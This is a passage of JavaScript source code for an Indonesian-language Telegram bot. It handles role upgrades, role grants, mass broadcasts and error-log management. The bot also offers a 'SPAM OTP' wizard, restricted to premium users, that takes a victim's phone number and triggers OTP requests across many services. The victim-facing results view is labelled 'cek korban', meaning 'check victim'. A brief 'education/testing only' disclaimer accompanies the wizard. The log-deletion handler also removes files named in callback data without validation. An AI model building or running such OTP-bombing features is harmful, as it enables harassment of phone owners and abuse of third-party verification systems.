            [{ text: `🚀 UPGRADE → ${targetRole.toUpperCase()}`, callback_data: 'upg_confirm', style: 'success', icon_custom_emoji_id: UPGRADE_EMOJI.check }],
            [{ text: '🔙 PILIH ROLE LAGI', callback_data: 'upg_retarget', style: 'primary' }],
            [{ text: '❌ BATAL', callback_data: 'upg_cancel', style: 'danger' }],
          ],
        };

        await bot.editRichMessage([
          `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.crown, '👑')} FINAL ROLE UPGRADE</b></blockquote>`,
          `<blockquote>👤 <b>Username</b> : <code>${escapeHtml(targetUser.username)}</code></blockquote>`,
          `<blockquote>🆔 <b>Telegram ID</b> : <code>${escapeHtml(String(targetUser.telegramId || '-'))}</code></blockquote>`,
          `<blockquote>📌 <b>Role Sekarang</b> : <b>${escapeHtml(upgradeRoleLabel(currentRole))}</b></blockquote>`,
          `<blockquote>🚀 <b>Role Target</b> : <b>${escapeHtml(upgradeRoleLabel(targetRole))}</b></blockquote>`,
          `<blockquote>${upgradeCe(UPGRADE_EMOJI.shield, '🛡️')} <b>Executor</b> : OWNER</blockquote>`,
          '',
          `<blockquote><b>⚠️ Perubahan akan langsung disimpan ke <code>database.json</code>.</b></blockquote>`,
        ].join('\n'), {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: confirmKeyboard,
        });
        return;
      }

      if (action === 'retarget') {
        if (!state) return;
        await showUpgradeTargetRoles(chatId, messageId, userId, state);
        return;
      }

      if (action === 'confirm') {
        if (!state || state.step !== 'CONFIRM' || !state.targetRole) {
          await bot.answerCallbackQuery(query.id, { text: '⏳ Sesi upgrade tidak valid.', show_alert: true }).catch(() => {});
          return;
        }

        const db = loadDatabase();
        const targetUser = db[state.targetIndex];
        if (!targetUser || targetUser.username !== state.targetUsername) {
          upgradeWizardState.delete(userId);
          await bot.answerCallbackQuery(query.id, { text: '❌ Target user sudah berubah/tidak ditemukan.', show_alert: true }).catch(() => {});
          return;
        }

        const currentRole = String(targetUser.role || 'member').toLowerCase();
        const targetRole = String(state.targetRole).toLowerCase();
        if (upgradeRoleIndex(targetRole) <= upgradeRoleIndex(currentRole)) {
          await bot.answerCallbackQuery(query.id, { text: '❌ Upgrade dibatalkan: target bukan role yang lebih tinggi.', show_alert: true }).catch(() => {});
          await showUpgradeCurrentRole(chatId, messageId, userId, Object.assign(targetUser, { __dbIndex: state.targetIndex }));
          return;
        }

        const previousRole = currentRole;
        const upgradedAt = new Date().toISOString();
        const ownerUsername = query.from.username || query.from.first_name || `Owner_${userId}`;

        try {
          targetUser.role = targetRole;
          targetUser.previousRole = previousRole;
          targetUser.roleUpdatedAt = upgradedAt;
          targetUser.roleUpdatedByTelegram = userId;
          targetUser.roleUpdatedBy = ownerUsername;
          saveDatabaseAtomicUpgrade(db);
        } catch (error) {
          console.error('[UPGRADE] Database save failed:', error.message);
          targetUser.role = previousRole;
          delete targetUser.previousRole;
          delete targetUser.roleUpdatedAt;
          delete targetUser.roleUpdatedByTelegram;
          delete targetUser.roleUpdatedBy;
          await bot.editRichMessage(
            `<blockquote><b>❌ UPGRADE GAGAL</b></blockquote>\n<blockquote>${upgradeCe(UPGRADE_EMOJI.warning, '⚠️')} Database gagal disimpan. <b>Tidak ada perubahan yang dikonfirmasi.</b></blockquote>`,
            { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 KEMBALI', callback_data: 'upg_back_users', style: 'primary' }]] } }
          );
          return;
        }

        saveUserLog(ownerUsername, 'role_upgrade', 'Owner Upgrade Role', `Target: ${targetUser.username} | ${previousRole} -> ${targetRole}`);
        upgradeWizardState.delete(userId);

        await bot.editRichMessage([
          `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.check, '✅')} ROLE UPGRADE SUCCESS</b></blockquote>`,
          `<blockquote>${upgradeCe(UPGRADE_EMOJI.user, '👤')} <b>Username</b> : <code>${escapeHtml(targetUser.username)}</code></blockquote>`,
          `<blockquote>🆔 <b>Telegram ID</b> : <code>${escapeHtml(String(targetUser.telegramId || '-'))}</code></blockquote>`,
          `<blockquote>📉 <b>Role Awal</b> : <b>${escapeHtml(upgradeRoleLabel(previousRole))}</b></blockquote>`,
          `<blockquote>📈 <b>Role Baru</b> : <b>${escapeHtml(upgradeRoleLabel(targetRole))}</b></blockquote>`,
          `<blockquote>${upgradeCe(UPGRADE_EMOJI.crown, '👑')} <b>Upgraded By</b> : ${escapeHtml(ownerUsername)}</blockquote>`,
          `<blockquote>🕒 <b>Waktu</b> : ${escapeHtml(new Date(upgradedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }))}</blockquote>`,
          `<blockquote>${upgradeCe(UPGRADE_EMOJI.shield, '🛡️')} <b>Database</b> : <code>database.json</code> • SAVED</blockquote>`,
          '',
          `<blockquote><i>Role upgrade berhasil diterapkan dan diverifikasi ulang sebelum commit.</i></blockquote>`,
        ].join('\n'), {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '👤 LIHAT USER', url: `tg://user?id=${Number(targetUser.telegramId)}` }],
              [{ text: '🚀 UPGRADE USER LAIN', callback_data: 'upg_back_users', style: 'success' }],
              [{ text: '🏠 MENU UTAMA', callback_data: 'mainmenu', style: 'primary' }],
            ],
          },
        });

        if (targetUser.telegramId) {
          try {
            await bot.sendRichMessage(Number(targetUser.telegramId), [
              `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.check, '🎉')} ROLE KAMU BERHASIL DI-UPGRADE</b></blockquote>`,
              `<blockquote>👤 <b>Username</b> : <code>${escapeHtml(targetUser.username)}</code></blockquote>`,
              `<blockquote>📉 <b>Role Lama</b> : ${escapeHtml(upgradeRoleLabel(previousRole))}</blockquote>`,
              `<blockquote>📈 <b>Role Baru</b> : <b>${escapeHtml(upgradeRoleLabel(targetRole))}</b></blockquote>`,
              `<blockquote>🛡️ Perubahan dilakukan oleh <b>OWNER</b>.</blockquote>`,
              `<blockquote><i>Selamat menikmati akses role baru di Mclaren Project.</i></blockquote>`,
            ].join('\n'), { parse_mode: 'HTML' });
          } catch (_) {}
        }
        return;
      }

      await bot.answerCallbackQuery(query.id, { text: '❌ Aksi upgrade tidak dikenali.', show_alert: true }).catch(() => {});
      return;
    }

    // ================================================================
    // 🚀 ADDIZIN CALLBACK HANDLERS
    // ================================================================
    if (data.startsWith("addizin_")) {
      const parts = data.split('_');
      const action = parts[1];

      if (action === 'cancel') {
        addizinWizardState.delete(userId);
        await bot.deleteMessage(chatId, messageId).catch(() => {});
        await bot.sendRichMessage(chatId, `
❌ <b>Dibatalkan</b>
Proses pemberian role dibatalkan.
        `, { parse_mode: "HTML" });
        return;
      }

      if (action === 'start' || action === 'retry') {
        await bot.deleteMessage(chatId, messageId).catch(() => {});
        const keyboard = {
          inline_keyboard: [
            [{ text: "❌ BATAL", callback_data: "addizin_cancel", style: "danger" }]
          ]
        };
        const sentMsg = await bot.sendRichMessage(chatId, `
🔍 <b>SIAPA USER YANG AKAN DI-ADD?</b>

Kirimkan <b>Telegram ID</b> atau <b>username</b> (dengan atau tanpa @) dari user yang ingin diberi role.

Contoh: <code>123456789</code> atau <code>@username</code>
        `, { parse_mode: "HTML", reply_markup: keyboard });
        addizinWizardState.set(userId, {
          step: 'WAITING_TARGET',
          instructionMessageId: sentMsg.message_id
        });
        return;
      }

      if (action === 'role') {
        const role = parts.slice(2).join('_');
        const state = addizinWizardState.get(userId);
        if (!state || state.step !== 'SELECTING_ROLE') {
          return bot.sendRichMessage(chatId, '⏳ Sesi telah berakhir atau langkah tidak valid. Silakan mulai ulang dengan /addizin.', { parse_mode: "HTML" });
        }

        const targetUser = state.targetUser;
        const ownerUser = getUserByTelegramId(userId);
        if (!ownerUser) {
          return bot.sendRichMessage(chatId, '❌ Data owner tidak ditemukan.', { parse_mode: "HTML" });
        }

        const allowedRoles = getAssignableRoles(ownerUser.role);
        if (!allowedRoles.includes(role)) {
          return bot.sendRichMessage(chatId, `
❌ Anda tidak memiliki izin untuk memberikan role <b>${role}</b>.
Role yang dapat Anda berikan: ${allowedRoles.join(', ')}
          `, { parse_mode: "HTML" });
        }

        state.selectedRole = role;
        state.step = 'CONFIRMING';
        addizinWizardState.set(userId, state);

        const confirmKeyboard = {
          inline_keyboard: [
            [
              { text: "✅ KONFIRMASI", callback_data: "addizin_confirm", style: "success" },
              { text: "🔙 KEMBALI", callback_data: "addizin_back", style: "primary" },
              { text: "❌ BATAL", callback_data: "addizin_cancel", style: "danger" }
            ]
          ]
        };

        await bot.editMessageText(`
📋 <b>KONFIRMASI ADD ROLE</b>

Target: <b>${targetUser.username || targetUser.telegramId}</b>
Telegram ID: <b>${targetUser.telegramId}</b>
Role Baru: <b>${role.toUpperCase()}</b>
Role Saat Ini: <b>${targetUser.role || 'belum ada'}</b>
Ditambahkan oleh: <b>${ownerUser.username || ownerUser.telegramId}</b>
Role pemberi: <b>${ownerUser.role}</b>

Apakah Anda yakin ingin memberikan role ini?
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: confirmKeyboard
        });
        return;
      }

      if (action === 'back') {
        const state = addizinWizardState.get(userId);
        if (!state) return;
        state.step = 'SELECTING_ROLE';
        addizinWizardState.set(userId, state);
        await showRoleSelector(chatId, messageId, userId, state.targetUser);
        return;
      }

      if (action === 'confirm') {
        const state = addizinWizardState.get(userId);
        if (!state || state.step !== 'CONFIRMING' || !state.selectedRole) {
          return bot.sendRichMessage(chatId, '⏳ Sesi tidak valid. Silakan mulai ulang dengan /addizin.', { parse_mode: "HTML" });
        }

        const targetUser = state.targetUser;
        const ownerUser = getUserByTelegramId(userId);
        if (!ownerUser) {
          return bot.sendRichMessage(chatId, '❌ Data owner tidak ditemukan.', { parse_mode: "HTML" });
        }

        const allowedRoles = getAssignableRoles(ownerUser.role);
        if (!allowedRoles.includes(state.selectedRole)) {
          return bot.sendRichMessage(chatId, `❌ Anda tidak memiliki izin untuk memberikan role ${state.selectedRole}.`, { parse_mode: "HTML" });
        }

        if (targetUser.role === state.selectedRole) {
          return bot.sendRichMessage(chatId, `⚠️ User <b>${targetUser.username || targetUser.telegramId}</b> sudah memiliki role <b>${state.selectedRole}</b>.`, { parse_mode: "HTML" });
        }

        upsertAddizinUser(
          targetUser.telegramId,
          targetUser.username || `User_${targetUser.telegramId}`,
          state.selectedRole,
          ownerUser.username || ownerUser.telegramId
        );

        saveUserLog('addizin', 'role_change',
          `Role diberikan oleh ${ownerUser.username || ownerUser.telegramId}`,
          `User ${targetUser.telegramId} mendapatkan role ${state.selectedRole}`
        );

        addizinWizardState.delete(userId);
        await bot.deleteMessage(chatId, messageId).catch(() => {});

        const successKeyboard = {
          inline_keyboard: [
            [
              { text: "👤 CEK PROFILE", callback_data: `addizin_profile_${targetUser.telegramId}`, style: "primary" },
              { text: "🔎 CEK YANG ADD", callback_data: `addizin_creator_${ownerUser.telegramId}`, style: "primary" }
            ],
            [
              { text: "🏠 MENU UTAMA", callback_data: "mainmenu", style: "primary" }
            ]
          ]
        };

        await bot.sendRichMessage(chatId, `
✅ <b>SUCCESS ADD</b>

User berhasil diberikan role.

👤 User: <b>${targetUser.username || targetUser.telegramId}</b>
🆔 Telegram ID: <b>${targetUser.telegramId}</b>
👑 Role: <b>${state.selectedRole.toUpperCase()}</b>
🛡 Ditambahkan oleh: <b>${ownerUser.username || ownerUser.telegramId}</b> (${ownerUser.role})
🕒 Waktu: <b>${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</b>
        `, { parse_mode: "HTML", reply_markup: successKeyboard });
        return;
      }

      if (action === 'profile') {
        const telegramId = parseInt(parts.slice(2).join('_'));
        const user = getUserByTelegramId(telegramId);
        if (!user) {
          return bot.sendRichMessage(chatId, '❌ User tidak ditemukan.', { parse_mode: "HTML" });
        }

        const profileMsg = `
👤 <b>PROFIL USER</b>

Username: <b>${user.username || 'Tidak diketahui'}</b>
Telegram ID: <b>${user.telegramId}</b>
Role: <b>${user.role || 'belum ada'}</b>
Status: ${user.addedAt ? 'TERDAFTAR di ADDIZIN' : 'TIDAK TERDAFTAR (dari database)'}
Dibuat oleh: <b>${user.addedBy || 'Sistem'}</b>
Tanggal dibuat: <b>${user.addedAt ? new Date(user.addedAt).toLocaleString('id-ID') : 'Tidak tersedia'}</b>
Expired: <b>${user.expiredDate || 'Tidak terbatas'}</b>
        `;
        await bot.sendRichMessage(chatId, profileMsg, { parse_mode: "HTML" });
        return;
      }

      if (action === 'creator') {
        const telegramId = parseInt(parts.slice(2).join('_'));
        const user = getUserByTelegramId(telegramId);
        if (!user) {
          return bot.sendRichMessage(chatId, '❌ User tidak ditemukan.', { parse_mode: "HTML" });
        }

        const creatorMsg = `
🔎 <b>INFORMASI PEMBERI ROLE</b>

Username: <b>${user.username || 'Tidak diketahui'}</b>
Role: <b>${user.role}</b>
Telegram ID: <b>${user.telegramId}</b>
Terakhir update role: <b>${user.updatedAt ? new Date(user.updatedAt).toLocaleString('id-ID') : 'Belum pernah'}</b>
Role sebelumnya: <b>${user.previousRole || '-'}</b>
        `;
        await bot.sendRichMessage(chatId, creatorMsg, { parse_mode: "HTML" });
        return;
      }

      await bot.sendRichMessage(chatId, '❌ Perintah tidak dikenal.', { parse_mode: "HTML" });
      return;
    }

    // ================================================================
    // 🚀 BROADCAST CALLBACK HANDLERS (FIXED)
    // ================================================================
    if (data.startsWith("bc_")) {
      const action = data.split('_')[1];

      // ─── BATAL ────────────────────────────────────────────────
      if (action === 'cancel' || action === 'batal') {
        pendingBroadcast.delete(userId);
        await bot.deleteMessage(chatId, messageId).catch(() => {});
        await bot.sendRichMessage(chatId, `
❌ <b>Dibatalkan</b>
Proses broadcast dibatalkan.
        `, { parse_mode: "HTML" });
        return;
      }

      // ─── BROADCAST LAGI (FIXED) ───────────────────────────────
      if (action === 'again') {
        pendingBroadcast.delete(userId);
        await bot.deleteMessage(chatId, messageId).catch(() => {});

        const keyboard = {
          inline_keyboard: [
            [
              { text: "📢 BC GROUP", callback_data: "bc_group", style: "primary" },
              { text: "👤 BC USER", callback_data: "bc_user", style: "primary" }
            ],
            [
              { text: "📣 BC CHANNEL", callback_data: "bc_channel", style: "primary" },
              { text: "🌍 BC ALL", callback_data: "bc_all", style: "success" }
            ],
            [
              { text: "❌ BATAL", callback_data: "bc_cancel", style: "danger" }
            ]
          ]
        };

        await bot.sendRichMessage(chatId, `
📢 <b>BROADCAST</b>

Pilih target broadcast:

📢 <b>BC GROUP</b> – Kirim ke semua grup
👤 <b>BC USER</b> – Kirim ke semua user (private)
📣 <b>BC CHANNEL</b> – Kirim ke semua channel
🌍 <b>BC ALL</b> – Kirim ke semua (grup+user+channel)

Kemudian kirimkan pesan yang ingin disebarkan.
        `, { parse_mode: "HTML", reply_markup: keyboard });
        return;
      }

      // ─── KONFIRMASI BROADCAST (FIXED — HANDLE SEBELUM TARGETMAP) ───
      if (action === 'confirm') {
        const bcState = pendingBroadcast.get(userId);
        if (!bcState || !bcState.content) {
          return bot.sendRichMessage(chatId, '❌ Tidak ada konten untuk broadcast.', { parse_mode: "HTML" });
        }

        const targetType = bcState.targetType;
        const content = bcState.content;
        const contentType = bcState.contentType;

        const targets = loadBroadcastTargets();
        let targetList = [];
        let targetLabel = '';

        if (targetType === 'group') {
          targetList = targets.groups;
          targetLabel = 'GROUP';
        } else if (targetType === 'user') {
          targetList = targets.users;
          targetLabel = 'USER';
        } else if (targetType === 'channel') {
          targetList = targets.channels;
          targetLabel = 'CHANNEL';
        } else if (targetType === 'all') {
          targetList = [...targets.groups, ...targets.users, ...targets.channels];
          targetLabel = 'ALL (Group + User + Channel)';
        }

        if (targetList.length === 0) {
          pendingBroadcast.delete(userId);
          return bot.sendRichMessage(chatId, `
⚠️ <b>Tidak ada target ${targetLabel}</b>
Belum ada chat yang terdaftar untuk jenis ini.
          `, { parse_mode: "HTML" });
        }

        let successCount = 0;
        let failCount = 0;
        const startTime = Date.now();

        for (const targetId of targetList) {
          try {
            if (contentType === 'text') {
              await bot.sendMessage(targetId, content.text, { parse_mode: "HTML" });
            } else if (contentType === 'photo') {
              await bot.sendPhoto(targetId, content.fileId, { caption: content.caption, parse_mode: "HTML" });
            } else if (contentType === 'video') {
              await bot.sendVideo(targetId, content.fileId, { caption: content.caption, parse_mode: "HTML" });
            }
            successCount++;
          } catch (err) {
            failCount++;
            console.error(`[BROADCAST] Gagal kirim ke ${targetId}:`, err.message);
          }
          await new Promise(resolve => setTimeout(resolve, 50));
        }

        const duration = ((Date.now() - startTime) / 1000).toFixed(2);

        const previewId = bcState.previewMessageId;
        if (previewId) {
          await bot.deleteMessage(chatId, previewId).catch(() => {});
        }
        pendingBroadcast.delete(userId);

        const logMessage = `
<blockquote>📬 <b>BROADCAST SELESAI</b></blockquote>

━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> ${targetLabel}
📎 <b>Tipe:</b> ${contentType.toUpperCase()}
✅ <b>Berhasil:</b> ${successCount}
❌ <b>Gagal:</b> ${failCount}
⏱️ <b>Waktu:</b> ${duration} detik
👤 <b>Dikirim oleh:</b> ${query.from.username || query.from.first_name}
━━━━━━━━━━━━━━━━━━

${successCount > 0 ? '✅ Broadcast berhasil dikirim.' : '⚠️ Tidak ada pesan terkirim.'}
        `;

        const keyboard = {
          inline_keyboard: [
            [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }],
            [{ text: "📢 BROADCAST LAGI", callback_data: "bc_again", style: "success" }]
          ]
        };

        await bot.sendRichMessage(chatId, logMessage, {
          parse_mode: "HTML",
          reply_markup: keyboard
        });
        return;
      }

      // ─── PILIH TARGET BROADCAST ───────────────────────────────
      const targetMap = {
        'group': 'GROUP',
        'user': 'USER',
        'channel': 'CHANNEL',
        'all': 'ALL (Group + User + Channel)'
      };
      if (!targetMap[action]) {
        return bot.sendRichMessage(chatId, '❌ Target tidak valid.', { parse_mode: "HTML" });
      }

      pendingBroadcast.set(userId, { targetType: action, step: 'waiting_content' });

      const keyboard = {
        inline_keyboard: [
          [{ text: "❌ BATAL", callback_data: "bc_cancel", style: "danger" }]
        ]
      };

      await bot.editRichMessage(`
✏️ <b>KIRIM KONTEN BROADCAST</b>

🎯 <b>Target:</b> ${targetMap[action]}

Silakan kirimkan:
• <b>Teks</b> (pesan biasa)
• <b>Foto</b> (dengan atau tanpa caption)
• <b>Video</b> (dengan atau tanpa caption)

Konten akan ditampilkan dalam preview sebelum dikirim.
Ketik <b>/batal</b> untuk membatalkan.
      `, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: keyboard
      });
      return;
    }

    // ================================================================
    // 🚀 SPAM OTP CALLBACK HANDLERS
    // ================================================================
    if (data.startsWith("spam_")) {
      const parts = data.split('_');
      const action = parts.slice(1).join('_');

      if (action === 'cancel') {
        spamWizardState.delete(userId);
        await bot.deleteMessage(chatId, messageId).catch(() => {});
        await bot.sendRichMessage(chatId, `
❌ <b>Dibatalkan</b>
Proses spam OTP dibatalkan.
        `, { parse_mode: "HTML" });
        return;
      }

      if (action === 'start') {
        if (!telegramIsOwner(userId) && !isPremiumSpamUser(userId)) {
          await bot.editRichMessage(`
❌ <b>Akses Ditolak</b>
Fitur SPAM OTP hanya untuk <b>premium user</b> dan <b>owner</b>.
Hubungi owner untuk mendapatkan akses.
          `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [] }
          });
          return;
        }

        spamWizardState.delete(userId);

        const keyboard = {
          inline_keyboard: [
            [
              { text: "🚀 LANJUTKAN", callback_data: "spam_continue", style: "success" },
              { text: "❌ BATAL", callback_data: "spam_cancel", style: "danger" }
            ]
          ]
        };

        await bot.editRichMessage(`
📱 <b>SPAM OTP</b>

Fitur ini akan mengirimkan permintaan OTP ke berbagai layanan menggunakan nomor target.

⚠️ <b>Perhatian:</b>
• Gunakan untuk tujuan edukasi / testing.
• Jangan digunakan untuk hal ilegal.
• Hanya untuk nomor yang Anda miliki atau dengan izin.

Klik <b>LANJUTKAN</b> untuk memasukkan nomor target.
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: keyboard
        });
        return;
      }

      if (action === 'continue') {
        const keyboard = {
          inline_keyboard: [
            [{ text: "❌ BATAL", callback_data: "spam_cancel", style: "danger" }]
          ]
        };

        await bot.editRichMessage(`
📱 <b>MASUKKAN NOMOR TARGET</b>

Masukkan nomor telepon dengan format <b>+628xxxxxxxxx</b>

Contoh: <code>+6281234567890</code>

Ketik /batal untuk membatalkan.
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: keyboard
        });

        spamWizardState.set(userId, { step: 'waiting_number' });
        return;
      }

      if (action === 'check_join') {
        const state = spamWizardState.get(userId);
        if (!state || !state.phone) {
          return bot.sendRichMessage(chatId, '❌ Sesi tidak valid. Mulai ulang dari menu.', { parse_mode: "HTML" });
        }

        const join = await checkJoinedChannels(userId);
        if (!join.configured || !join.ok) {
          const keyboard = {
            inline_keyboard: [
              [
                { text: "📢 JOIN CHANNEL 1", url: getChannelUrl(CHANNEL_1) },
                { text: "📢 JOIN CHANNEL 2", url: getChannelUrl(CHANNEL_2) }
              ],
              [
                { text: "✅ CEK JOIN", callback_data: "spam_check_join", style: "success" },
                { text: "❌ BATAL", callback_data: "spam_cancel", style: "danger" }
              ]
            ]
          };

          await bot.editRichMessage(`
🔐 <b>WAJIB JOIN CHANNEL</b>

Untuk melanjutkan spam OTP, Anda harus join:
1️⃣ ${CHANNEL_1}
2️⃣ ${CHANNEL_2}

Klik tombol di bawah untuk join, lalu tekan <b>CEK JOIN</b>.
          `, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: "HTML",
            reply_markup: keyboard
          });
          return;
        }

        await bot.editRichMessage(`
✅ <b>Join Channel Terverifikasi!</b>

Memulai proses spam OTP ke nomor <b>${state.phone}</b>...

⏳ Mohon tunggu sebentar.
        `, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: "HTML",
          reply_markup: { inline_keyboard: [] }
        });

        await runSpamProcess(chatId, userId, state.phone);
        return;
      }

      if (action === 'cek_korban') {
        const state = spamWizardState.get(userId);
        if (!state || !state.lastResult) {
          return bot.sendRichMessage(chatId, '❌ Belum ada hasil spam.', { parse_mode: "HTML" });
        }

        const result = state.lastResult;
        const successCount = result.filter(r => r.status === 'success').length;
        const failCount = result.filter(r => r.status === 'failed' || r.status === 'error').length;
        const total = result.length;

        let msg = `
📊 <b>HASIL SPAM TERAKHIR</b>

📱 <b>Nomor:</b> ${state.phone}
✅ <b>Sukses:</b> ${successCount}
❌ <b>Gagal:</b> ${failCount}
📦 <b>Total:</b> ${total}

<blockquote>📋 <b>Detail Target:</b></blockquote>
`;

        const topResults = result.slice(0, 10);
        for (const r of topResults) {
          const icon = r.status === 'success' ? '✅' : r.status === 'failed' ? '❌' : '⚠️';
          msg += `${icon} ${r.name}\n`;
        }
        if (result.length > 10) msg += `\n... dan ${result.length - 10} layanan lainnya.`;

        const keyboard = {
          inline_keyboard: [
            [{ text: "📱 SPAM LAGI", callback_data: "spam_start", style: "primary" }],
            [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }]
          ]
        };

        await bot.sendRichMessage(chatId, msg, {
          parse_mode: "HTML",
          reply_markup: keyboard
        });
        return;
      }

      await bot.sendRichMessage(chatId, '❌ Perintah tidak dikenal.', { parse_mode: "HTML" });
      return;
    }

    // ─── ERROR ANALYZE ──────────────────────────────────────────
    if (data.startsWith('error_analyze_')) {
      const fileName = data.replace('error_analyze_', '');
      const filePath = path.join(__dirname, 'logs', fileName);

      if (!fs.existsSync(filePath)) {
        await bot.answerCallbackQuery(query.id, { text: '❌ File error tidak ditemukan.', show_alert: true }).catch(() => {});
        return;
      }

      try {
        const content = fs.readFileSync(filePath, 'utf8');
        let analysis = '📊 **ANALISIS ERROR DETAIL**\n\n';

        const typeMatch = content.match(/Tipe:\s*(.+)/);
        const locationMatch = content.match(/Lokasi:\s*(.+)/);
        const causeMatch = content.match(/Penyebab:\s*(.+)/);
        const suggestionMatch = content.match(/Saran:\s*(.+)/);
        const stackMatch = content.match(/Stack Trace:\n([\s\S]+)/);

        if (typeMatch) analysis += `📌 **Tipe:** ${typeMatch[1]}\n`;
        if (locationMatch) analysis += `📍 **Lokasi:** ${locationMatch[1]}\n`;
        if (causeMatch) analysis += `⚠️ **Penyebab:** ${causeMatch[1]}\n`;
        if (suggestionMatch) analysis += `💡 **Saran:** ${suggestionMatch[1]}\n\n`;

        if (stackMatch) {
          const stackLines = stackMatch[1].split('\n').slice(0, 10);
          analysis += `📝 **Stack Trace (10 baris pertama):**\n\`\`\`\n${stackLines.join('\n')}\n\`\`\`\n\n`;
        }

        const timestampMatch = content.match(/Waktu:\s*(.+)/);
        if (timestampMatch) analysis += `🕒 **Waktu:** ${timestampMatch[1]}\n`;

        const contextMatch = content.match(/Konteks:\s*([\s\S]+)/);
        if (contextMatch) {
          try {
            const context = JSON.parse(contextMatch[1]);
            analysis += `📦 **Konteks:**\n\`\`\`json\n${JSON.stringify(context, null, 2)}\n\`\`\``;
          } catch (_) {
            analysis += `📦 **Konteks:** ${contextMatch[1]}`;
          }
        }

        await bot.editMessageText(analysis, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🗑️ Hapus Info', callback_data: `error_delete_${fileName}`, style: 'danger' },
                { text: '📋 Menu Utama', callback_data: 'mainmenu', style: 'primary' }
              ]
            ]
          }
        });
      } catch (err) {
        console.error('[ERROR ANALYZE]', err);
        await bot.answerCallbackQuery(query.id, { text: '✅ Siap dikonfirmasi.', show_alert: false }).catch(() => {});
      }
      return;
    }

    // ─── ERROR DELETE ──────────────────────────────────────────
    if (data.startsWith('error_delete_')) {
      const fileName = data.replace('error_delete_', '');
      const filePath = path.join(__dirname, 'logs', fileName);

      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }

      await bot.editMessageText('🗑️ **Error log telah dihapus.**', {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📋 Menu Utama', callback_data: 'mainmenu', style: 'primary' }]
          ]
        }
      });
      return;
    }

  } catch (err) {
    console.error("[TELEGRAM CALLBACK]", err);
    const errorMsg = createErrorPanel(`Terjadi kesalahan: ${err.message || 'unknown'}`);
    return bot.sendRichMessage(chatId || userId, errorMsg, { parse_mode: "HTML" }).catch(() => {});
  }
});

// ===== COMMAND: /create (Pilih Metode) =====
bot.onText(/^\/?(create|buatakun)\b/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username || msg.from.first_name;

  // Cek apakah user sudah punya pending request sebelumnya
  const pending = pendingTelegramInput.get(Number(userId));
  if (pending && (pending.type === "create_account_photo" || pending.type === "create_account_manual_data" || pending.type === "create_account_choose_method")) {
    return bot.sendRichMessage(chatId, "⏳ Kamu masih dalam proses pembuatan akun. Selesaikan proses sebelumnya atau ketik /batal untuk membatalkan.");
  }

  // Tampilkan pilihan metode
  const keyboard = {
    inline_keyboard: [
      [
        { text: "📝 Manual Custom Request", callback_data: "create_method_manual", style: "primary" },
        { text: "⚡ Otomatis Create", callback_data: "create_method_auto", style: "success" }
      ],
      [
        { text: "❌ Batal", callback_data: "cancel_create", style: "danger" }
      ]
    ]
  };

  await bot.sendRichMessage(chatId, `
<blockquote>📢 <b>Pilih Metode Pembuatan Akun</b></blockquote>

Halo <b>${username}</b>! 👋

Silakan pilih metode pembuatan akun:

📝 <b>Manual Custom Request</b> – Anda akan mengisi sendiri username, password, role, dan durasi.
⚡ <b>Otomatis Create</b> – Bot akan membuatkan akun secara acak (username, password, role member, durasi 30 hari).

Setelah memilih, Anda akan diminta mengirimkan <b>FOTO BUKTI TRANSFER</b>.
  `.trim(), {
    parse_mode: "HTML",
    reply_markup: keyboard
  });
});

setTimeout(() => {
  const targetChatId = "-1004340267673";

  // ─── Ambil Data dari Database ──────────────────────────────────────
  const db = loadDatabase();
  const totalUsers = db.length;
  const roleCounts = {};
  db.forEach(u => {
    const role = u.role || 'member';
    roleCounts[role] = (roleCounts[role] || 0) + 1;
  });

  // ─── Count per Role ──────────────────────────────────────────────────
  const ownerUtama = roleCounts['owner_utama'] || 0;
  const owner = roleCounts['owner'] || 0;
  const staff = roleCounts['staff'] || 0;
  const executorius = roleCounts['executorius'] || 0;
  const foriusUtama = roleCounts['forius_utama'] || 0;
  const moderator = roleCounts['moderator'] || 0;
  const ceoUtama = roleCounts['ceo_utama'] || 0;
  const tanganKanan = roleCounts['tangan_kanan'] || 0;
  const tanganKiri = roleCounts['tangan_kiri'] || 0;
  const developers = roleCounts['developers'] || 0;
  const partnerPribadi = roleCounts['partner_pribadi'] || 0;
  const partner = roleCounts['partner'] || 0;
  const admin = roleCounts['admin'] || 0;
  const reseller = roleCounts['reseller'] || 0;
  const tukangBubur = roleCounts['tukang_bubur'] || 0;
  const vip = roleCounts['vip'] || 0;
  const member = roleCounts['member'] || 0;

  // ─── Ambil Owner ID Pertama untuk Tombol ────────────────────────────
  const cfg = loadTelegramConfig();
  const ownerList = cfg.ownerList || [];
  const firstOwnerId = ownerList.length > 0 ? ownerList[0] : null;

  // ─── Waktu Startup ────────────────────────────────────────────────────
  const startTime = new Date().toLocaleString('en-US', { 
    timeZone: 'Asia/Jakarta',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

